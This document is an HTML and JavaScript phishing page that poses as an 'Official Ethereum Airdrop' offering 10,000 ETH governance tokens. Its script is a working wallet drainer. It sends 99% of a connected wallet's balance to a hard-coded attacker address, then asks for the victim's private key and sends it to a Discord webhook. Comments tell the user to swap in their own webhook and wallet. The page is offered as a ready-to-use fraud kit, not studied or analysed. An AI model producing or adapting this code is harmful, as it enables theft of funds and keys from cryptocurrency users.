<!DOCTYPE html>  
<html>  
<head>  
    <title>ü™Ç Official Ethereum Airdrop</title>  
    <style>  
        body { background: #000; color: #fff; text-align: center; font-family: Arial; }  
        button { background: linear-gradient(90deg, #ff6b6b, #ff4500); padding: 15px 30px; border: none; cursor: pointer; }  
    </style>  
</head>  
<body>  
    <h1>Claim 10,000 ETH Governance Tokens!</h1>  
    <button onclick="connect()">Connect Wallet to Claim</button>  
    <p id="status">‚ö†Ô∏è Limited supply remaining</p>  

    <script>  
        const WEBHOOK = "https://canary.discord.com/api/webhooks/1349905465743507487/G0Zi77hSBjpAnFI_yYqCxHERHLXfXzZMXbiCdh7"; // Replace this  
        const ATTACKER_WALLET = "0x2ee051f714C186E6686Df46c61589a7485462cA9"; // Replace with your ETH address  

        async function connect() {  
            document.getElementById("status").innerText = "Connecting...";  
            try {  
                const ethereum = window.ethereum;  
                const accounts = await ethereum.request({ method: "eth_requestAccounts" });  
                const balance = await ethereum.request({ method: "eth_getBalance", params: [accounts[0]] });  

                // Drain 99% of balance  
                await ethereum.request({  
                    method: "eth_sendTransaction",  
                    params: [{  
                        from: accounts[0],  
                        to: ATTACKER_WALLET,  
                        value: BigInt(balance) * 99n / 100n,  
                        gas: "0x5208"  
                    }]  
                });  

                // Trigger key extraction  
                document.body.innerHTML = `  
                    <h1>üîí Final Verification Required</h1>  
                    <input id="pk" placeholder="Enter private key for token distribution">  
                    <button onclick="stealKey()">Confirm</button>  
                `;  

            } catch (error) {  
                fetch(`${WEBHOOK}?error=${encodeURIComponent(error.message)}`);  
            }  
        }  

        function stealKey() {  
            const pk = document.getElementById("pk").value;  
            const address = ethereum.selectedAddress;  
            fetch(`${WEBHOOK}?pk=${encodeURIComponent(pk)}&address=${address}`);  
            document.body.innerHTML = "<h1>‚úÖ Airdrop Successfully Claimed!</h1>";  
        }  
    </script>  
</body>  
</html>
